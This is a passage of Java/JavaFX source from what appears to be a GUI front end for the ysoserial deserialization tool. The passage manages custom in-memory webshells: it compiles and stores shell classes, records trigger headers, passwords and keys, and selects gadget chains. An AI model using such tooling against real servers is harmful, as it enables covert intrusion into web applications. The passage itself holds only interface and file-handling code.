        javafx.scene.Node okBtn = dlg.getDialogPane().lookupButton(ButtonType.OK);
        okBtn.setDisable(true);
        nameField.textProperty().addListener((obs, o, n) -> validateAddInputs(okBtn, nameField, classNameField, classField));
        classNameField.textProperty().addListener((obs, o, n) -> validateAddInputs(okBtn, nameField, classNameField, classField));
        classField.textProperty().addListener((obs, o, n) -> validateAddInputs(okBtn, nameField, classNameField, classField));

        dlg.setResultConverter(btn -> {
            if (btn == ButtonType.OK) {
                String name = nameField.getText().trim();
                String className = classNameField.getText().trim();
                String srcPath = classField.getText().trim();
                if (name.isEmpty() || className.isEmpty() || srcPath.isEmpty()) return null;

                try {
                    String localPath = copyShellFile(srcPath, name);
                    MemshellConfig config = new MemshellConfig();
                    config.setName(name);
                    config.setType(typeCombo.getValue());
                    config.setMode(modeCombo.getValue());
                    config.setServerType(serverField.getText().trim());
                    config.setBuiltin(false);
                    config.setClassFile(localPath);
                    config.setClassName(className);
                    config.setDescription(descArea.getText().trim());

                    if ("echo".equals(modeCombo.getValue())) {
                        config.setTriggerHeader(headerField.getText().trim());
                        config.setTriggerPath(pathField.getText().trim());
                    } else {
                        config.setTool(toolField.getText().trim());
                        config.setPassword(passField.getText().trim());
                        config.setSecretKey(keyField.getText().trim());
                    }
                    return config;
                } catch (Exception e) {
                    new Alert(Alert.AlertType.ERROR, "文件处理失败: " + e.getMessage(), ButtonType.OK).showAndWait();
                    return null;
                }
            }
            return null;
        });

        dlg.showAndWait().ifPresent(config -> {
            MemshellManager.putCustom(config);
            refreshList();
            setStatus("✓ 已添加内存马: " + config.getName());
        });
    }

    private void validateAddInputs(javafx.scene.Node okBtn, TextField nameField, TextField classNameField, TextField classField) {
        boolean valid = !nameField.getText().trim().isEmpty()
                     && !classNameField.getText().trim().isEmpty()
                     && !classField.getText().trim().isEmpty();
        okBtn.setDisable(!valid);
    }

    private void deleteSelected() {
        MemshellConfig shell = shellListView.getSelectionModel().getSelectedItem();
        if (shell == null) return;
        if (shell.isBuiltin()) {
            mainWindow.showError("内置内存马不可删除");
            return;
        }
        MemshellManager.removeCustom(shell.getName());
        refreshList();
        setStatus("已删除: " + shell.getName());
    }

    private void refreshList() {
        shellListView.getItems().setAll(MemshellManager.getBuiltins().values());
    }

    // ──── 文件处理 ────────────────────────────────────────────────────────────

    /**
     * 复制内存马文件到项目目录 memshells/ 目录
     */
    private String copyShellFile(String srcPath, String shellName) throws Exception {
        File srcFile = new File(srcPath);
        if (!srcFile.exists()) throw new Exception("文件不存在: " + srcPath);

        Path shellDir = Paths.get("shells");
        Files.createDirectories(shellDir);

        String fileName = srcFile.getName();

        if (fileName.endsWith(".java")) {
            File classFile = compileJavaFile(srcFile);
            if (classFile == null) throw new Exception("Java 编译失败，请确保 javac 在 PATH 中");
            try {
                Path dest = shellDir.resolve(classFile.getName());
                Files.copy(classFile.toPath(), dest, StandardCopyOption.REPLACE_EXISTING);
                copyInnerClasses(classFile, shellDir);
                return dest.toString();
            } finally {
                FileCleanup.deleteRecursivelyQuietly(classFile.getParentFile().toPath());
            }
        } else if (fileName.endsWith(".class")) {
            Path dest = shellDir.resolve(fileName);
            Files.copy(srcFile.toPath(), dest, StandardCopyOption.REPLACE_EXISTING);
            copyInnerClasses(srcFile, shellDir);
            return dest.toString();
        } else {
            throw new Exception("不支持的文件类型: " + fileName);
        }
    }

    private void copyInnerClasses(File classFile, Path shellDir) throws Exception {
        String baseName = classFile.getName().replace(".class", "");
        File parentDir = classFile.getParentFile();
        File[] innerClasses = parentDir.listFiles(f ->
            f.getName().startsWith(baseName + "$") && f.getName().endsWith(".class"));
        if (innerClasses != null) {
            for (File ic : innerClasses) {
                Path icDest = shellDir.resolve(ic.getName());
                Files.copy(ic.toPath(), icDest, StandardCopyOption.REPLACE_EXISTING);
            }
        }
    }

    private File compileJavaFile(File javaFile) {
        Path tmpDir = null;
        try {
            String javac = "javac";
            String javaHome = System.getProperty("java.home");
            if (javaHome != null) {
                File javacFile = new File(javaHome, "bin/javac" +
                    (System.getProperty("os.name").contains("Windows") ? ".exe" : ""));
                if (javacFile.exists()) javac = javacFile.getAbsolutePath();
            }

            tmpDir = Files.createTempDirectory("ysogui-shell-");
            ProcessBuilder pb = new ProcessBuilder(javac, "-d", tmpDir.toString(), javaFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process proc = pb.start();
            int exitCode = proc.waitFor();
            if (exitCode != 0) {
                ByteArrayOutputStream errOut = new ByteArrayOutputStream();
                byte[] buf = new byte[1024];
                int len;
                while ((len = proc.getInputStream().read(buf)) != -1) errOut.write(buf, 0, len);
                throw new Exception("javac 编译失败:\n" + new String(errOut.toByteArray(), StandardCharsets.UTF_8));
            }

            File[] classFiles = tmpDir.toFile().listFiles(f ->
                f.getName().endsWith(".class") && !f.getName().contains("$"));
            if (classFiles != null && classFiles.length > 0) {
                return classFiles[0];
            }
            FileCleanup.deleteRecursivelyQuietly(tmpDir);
            return null;
        } catch (Exception e) {
            FileCleanup.deleteRecursivelyQuietly(tmpDir);
            new Alert(Alert.AlertType.ERROR, "Java 编译失败: " + e.getMessage(), ButtonType.OK).showAndWait();
            return null;
        }
    }

    /**
     * 从 .class 文件路径推导完整类名
     */
    private String deriveClassName(File file) {
        String name = file.getName();
        if (name.endsWith(".java")) return name.replace(".java", "");

        String fullName = name.replace(".class", "");
        File dir = file.getParentFile();
        String[] packageRoots = {"com", "org", "net", "io", "me", "cn"};
        java.util.List<String> parts = new java.util.ArrayList<>();
        parts.add(0, fullName);

        File current = dir;
        while (current != null) {
            File[] subDirs = current.listFiles(f -> f.isDirectory());
            if (subDirs != null) {
                for (String root : packageRoots) {
                    for (File sd : subDirs) {
                        if (sd.getName().equals(root)) {
                            java.util.List<String> pkgParts = new java.util.ArrayList<>();
                            File p = dir;
                            while (p != null && !p.equals(current)) {
                                pkgParts.add(0, p.getName());
                                p = p.getParentFile();
                            }
                            pkgParts.addAll(parts);
                            return String.join(".", pkgParts);
                        }
                    }
                }
            }
            parts.add(0, current.getName());
            current = current.getParentFile();
        }
        return fullName;
    }

    private void showMemshellHelp() {
        Alert help = new Alert(Alert.AlertType.INFORMATION);
        help.setTitle("自定义内存马编写指南");
        help.setHeaderText("自定义内存马编写指南");

        TextArea content = new TextArea();
        content.setEditable(false);
        content.setWrapText(true);
        content.setStyle("-fx-font-family: Consolas; -fx-font-size: 11; -fx-background-color: #fafafa;");
        content.setPrefSize(620, 520);
        content.setText(JavaCompileUtil.readHelpResource("custom-memshell-help.txt"));

        help.getDialogPane().setContent(content);
        help.getButtonTypes().setAll(ButtonType.OK);
        help.showAndWait();
    }

    // ──── 样式工具 ────────────────────────────────────────────────────────────

    /**
     * 判断事件目标是否在 TextArea 内部。
     * 用于 ScrollPane 的滚轮事件过滤器，避免拦截 TextArea 的滚轮事件。
     */
    private boolean isInsideTextArea(Object target) {
        if (target instanceof TextArea) return true;
        if (target instanceof javafx.scene.Node) {
            javafx.scene.Node node = (javafx.scene.Node) target;
            while (node != null) {
                if (node instanceof TextArea) return true;
                node = node.getParent();
            }
        }
        return false;
    }

    /**
     * 为 TextArea 添加滚轮事件冒泡拦截。
     * 当 TextArea 处理完滚轮事件后，阻止事件继续冒泡到父级 ScrollPane，
     * 避免 ScrollPane 也跟着滚动。
     */
    private void enableTextAreaScroll(TextArea textArea) {
        textArea.addEventHandler(javafx.scene.input.ScrollEvent.SCROLL, event -> {
            event.consume(); // TextArea 处理完后消费事件，阻止冒泡到 ScrollPane
        });
    }

    private TextField styledTextField(String def) {
        TextField tf = new TextField(def);
        tf.setStyle(
            "-fx-background-color: #fff; -fx-text-fill: #333; " +
            "-fx-border-color: #ccc; -fx-font-family: Consolas; " +
            "-fx-font-size: 12; -fx-padding: 4 8;"
        );
        return tf;
    }

    private Button actionBtn(String label) {
        Button b = new Button(label);
        b.setStyle("-fx-background-color: #e0e0e0; -fx-text-fill: #333; " +
                   "-fx-border-color: #bbb; -fx-font-size: 11; -fx-padding: 4 10;");
        return b;
    }

    private void setStatus(String msg) {
        Platform.runLater(() -> {
            statusLabel.setText(msg);
            if (msg.startsWith("✓")) {
                statusLabel.setStyle("-fx-text-fill: #2e8b57; -fx-font-size: 11;");
            } else if (msg.startsWith("✗")) {
                statusLabel.setStyle("-fx-text-fill: #cc3333; -fx-font-size: 11;");
            } else {
                statusLabel.setStyle("-fx-text-fill: #888; -fx-font-size: 11;");
            }
        });
    }

    // ──── Public API ─────────────────────────────────────────────────────────

    public void setGenerator(PayloadGenerator gen) {
        this.generator = gen;
        refreshList();
    }

    /**
     * 链切换时调用，更新链选择下拉框和支持状态
     */
    public void setChain(ChainInfo chain) {
        this.currentChain = chain;
        Platform.runLater(() -> {
            if (chain == null) {
                chainSupportLabel.setText("未选择链");
                chainSupportLabel.setStyle("-fx-text-fill: #888; -fx-font-size: 11;");
                return;
            }

            // 添加到下拉框（如果不在列表中）
            String chainName = chain.getName();
            if (chainCombo.getItems().stream().noneMatch(c -> c.equals(chainName))) {
                chainCombo.getItems().add(chainName);
            }
            chainCombo.setValue(chainName);

            // 更新支持状态
            boolean supported = ChainMetaManager.supportsBuiltinTemplate(chainName);
            if (supported) {
                chainSupportLabel.setText("✓ 当前链支持 yso CLASS: 内置模板");
                chainSupportLabel.setStyle("-fx-text-fill: #2e8b57; -fx-font-size: 11; -fx-font-weight: bold;");
            } else {
                String reason = ChainMetaManager.getBuiltinTemplateReason(chainName);
                chainSupportLabel.setText("✗ 当前链不支持 yso CLASS: 模板: " + (reason != null ? reason : ""));
                chainSupportLabel.setStyle("-fx-text-fill: #cc3333; -fx-font-size: 11;");
            }
        });
    }

    /**
     * 加载 jar 后设置可用链列表
     */
    public void setAvailableChains(java.util.List<ChainInfo> chains) {
        Platform.runLater(() -> {
            chainCombo.getItems().clear();
            for (ChainInfo c : chains) {
                chainCombo.getItems().add(c.getName());
            }
            // 刷新内存马列表
            refreshList();
        });
    }
}
